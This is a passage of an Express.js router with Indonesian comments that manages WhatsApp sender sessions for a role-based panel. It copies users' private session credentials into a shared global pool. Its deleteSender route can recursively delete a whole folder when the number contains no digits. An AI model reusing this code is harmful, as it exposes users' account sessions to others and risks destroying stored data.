            fs.writeFileSync(destVip, data);
            logger.info('Session saved to global: ' + destVip);
          } else {
            // Private: simpan ke permenmd/<owner>/ DAN vip/ (global pool)
            const destPrivate = path.join('permenmd', owner, `${number}.json`);
            fs.writeFileSync(destPrivate, data);
            logger.info('Session saved to private: ' + destPrivate);

            if (!fs.existsSync('vip')) fs.mkdirSync('vip', { recursive: true });
            const destVip = path.join('vip', `${number}.json`);
            fs.writeFileSync(destVip, data);
            logger.info('Session also saved to global pool: ' + destVip);
          }
        }
      } catch (e) {
        logger.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}

// Helper function to detect WhatsApp type from credentials
function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

// Helper function to get active connections in a folder
function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
   
  // If folder doesn't exist, return empty array
  if (!fs.existsSync(folderPath)) {
    logger.info(`[DEBUG] Folder ${folderPath} tidak ditemukan`);
    return [];
  }

  // Get all .json files in user folder
  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  logger.info(`[DEBUG] Ditemukan ${jsonFiles.length} file JSON di folder ${subfolderName}`);

  // Loop through each JSON file
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    
    // Check if this session is active in activeConnections
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName,
        isActive: true,
        type: detectWATypeFromCreds(path.join(folderPath, file)) // Add WA type
      });
      
      logger.info(`[DEBUG] Session aktif ditemukan: ${sessionName}`);
    }
  }

  return activeCreds;
}

// FUNGSI INI DIHAPUS KARENA SUDAH DIIMPOR DARI SERVICE
// async function checkActiveSessionInFolder(subfolderName, isVipOrOwnerUser = false) { ... }

// Helper function to get user's active sessions
function getUserActiveSessions(username) {
  const folderPath = path.join('permenmd', username);
   
  // If folder doesn't exist, return empty array
  if (!fs.existsSync(folderPath)) {
    logger.info(`[DEBUG] Folder ${folderPath} tidak ditemukan`);
    return [];
  }

  // Get all .json files in user folder
  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const userSessions = [];

  logger.info(`[DEBUG] Ditemukan ${jsonFiles.length} file JSON di folder ${username}`);

  // Loop through each JSON file
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    
    // Check if this session is active in activeConnections
    if (activeConnections[sessionName]) {
      const credsPath = path.join(folderPath, file);
      const type = detectWATypeFromCreds(credsPath);
      
      userSessions.push({
        sessionName: sessionName,
        sock: activeConnections[sessionName],
        type: type,
        isActive: true
      });
      
      logger.info(`[DEBUG] Session aktif ditemukan: ${sessionName} (${type})`);
    }
  }

  return userSessions;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


// ============ SENDER MANAGEMENT ============

// GET /getSenders - ambil list global & private senders milik user
router.get("/getSenders", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, error: "User not found" });

  const allowedRoles = ["vip", "reseller", "owner", "high admin", "admin", "dev", "ceo", "member"]
  if (!allowedRoles.includes(user.role)) {
    return res.status(403).json({ valid: false, error: "Access denied" });
  }

  // Private senders: file .json di permenmd/<username>/
  const privateSenders = [];
  const privateFolder = path.join("permenmd", user.username);
  if (fs.existsSync(privateFolder)) {
    fs.readdirSync(privateFolder)
      .filter(f => f.endsWith(".json"))
      .forEach(f => {
        const number = path.basename(f, ".json");
        privateSenders.push({ number, type: "private" });
      });
  }

  // Global senders: file .json di vip/
  const globalSenders = [];
  if (fs.existsSync("vip")) {
    fs.readdirSync("vip")
      .filter(f => f.endsWith(".json"))
      .forEach(f => {
        const number = path.basename(f, ".json");
        globalSenders.push({ number, type: "global" });
      });
  }

  return res.json({ valid: true, globalSenders, privateSenders });
});

// POST /addSender - tambah sender (private atau global)
router.post("/addSender", async (req, res) => {
  const { key, number, type } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ success: false, message: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ success: false, message: "User not found" });

  const allowedRoles = ["vip", "reseller", "reseller1", "owner", "high admin", "admin", "dev", "ceo", "member"];
  if (!allowedRoles.includes(user.role)) {
    return res.status(403).json({ success: false, message: "Access denied" });
  }

  if (!number || !type) {
    return res.status(400).json({ success: false, message: "number dan type wajib diisi" });
  }

  const cleanNumber = number.replace(/\D/g, "");
  if (!cleanNumber || cleanNumber.length < 8) {
    return res.status(400).json({ success: false, message: "Nomor tidak valid" });
  }

  if (!["global", "private"].includes(type)) {
    return res.status(400).json({ success: false, message: "type harus global atau private" });
  }

  // Member tidak boleh tambah global sender
  if (type === "global" && user.role === "member") {
    return res.status(403).json({ success: false, message: "Member tidak bisa mengelola global sender" });
  }

  try {
    let sessionDir, destCreds;

    if (type === "global") {
      sessionDir = path.join("vip", cleanNumber);
      destCreds  = path.join("vip", `${cleanNumber}.json`);
      if (!fs.existsSync("vip")) fs.mkdirSync("vip", { recursive: true });
    } else {
      sessionDir = path.join("permenmd", user.username, cleanNumber);
      destCreds  = path.join("permenmd", user.username, `${cleanNumber}.json`);
      if (!fs.existsSync(path.join("permenmd", user.username)))
        fs.mkdirSync(path.join("permenmd", user.username), { recursive: true });
    }

    // Cek apakah creds sudah ada
    if (fs.existsSync(destCreds)) {
      return res.json({ success: true, message: "Sender sudah ada, tidak perlu ditambah lagi" });
    }

    // Buat folder session
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    // Simpan placeholder supaya getSenders langsung keliatan
    fs.writeFileSync(destCreds, JSON.stringify({ number: cleanNumber, type, addedBy: user.username, addedAt: Date.now() }));

    logger.info(`[SUCCESS ADD SENDER] ${user.username} added ${type} sender: ${cleanNumber}`);
    return res.json({ success: true, message: `Sender ${cleanNumber} berhasil ditambahkan sebagai ${type}` });

  } catch (err) {
    logger.error(`[ERROR ADD SENDER] ${err.message}`);
    return res.status(500).json({ success: false, message: "Terjadi kesalahan server: " + err.message });
  }
});

// POST /deleteSender - hapus sender
router.post("/deleteSender", (req, res) => {
  const { key, number, type } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ success: false, message: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ success: false, message: "User not found" });

  const allowedRoles = ["vip", "reseller", "reseller1", "owner", "high admin", "admin", "dev", "ceo", "member"];
  if (!allowedRoles.includes(user.role)) {
    return res.status(403).json({ success: false, message: "Access denied" });
  }

  if (!number || !type) {
    return res.status(400).json({ success: false, message: "number dan type wajib diisi" });
  }

  // Member tidak boleh hapus global sender
  if (type === "global" && user.role === "member") {
    return res.status(403).json({ success: false, message: "Member tidak bisa mengelola global sender" });
  }

  const cleanNumber = number.replace(/\D/g, "");

  try {
    let credsPath, sessionDir;

    if (type === "global") {
      credsPath  = path.join("vip", `${cleanNumber}.json`);
      sessionDir = path.join("vip", cleanNumber);
    } else {
      credsPath  = path.join("permenmd", user.username, `${cleanNumber}.json`);
      sessionDir = path.join("permenmd", user.username, cleanNumber);
    }

    if (fs.existsSync(credsPath)) fs.unlinkSync(credsPath);
    if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });

    if (activeConnections[cleanNumber]) delete activeConnections[cleanNumber];

    logger.info(`[SUCCESS DELETE SENDER] ${user.username} deleted ${type} sender: ${cleanNumber}`);
    return res.json({ success: true, message: `Sender ${cleanNumber} berhasil dihapus` });

  } catch (err) {
    logger.error(`[ERROR DELETE SENDER] ${err.message}`);
    return res.status(500).json({ success: false, message: "Terjadi kesalahan server: " + err.message });
  }
});

// ============ END SENDER MANAGEMENT ============

module.exports = router;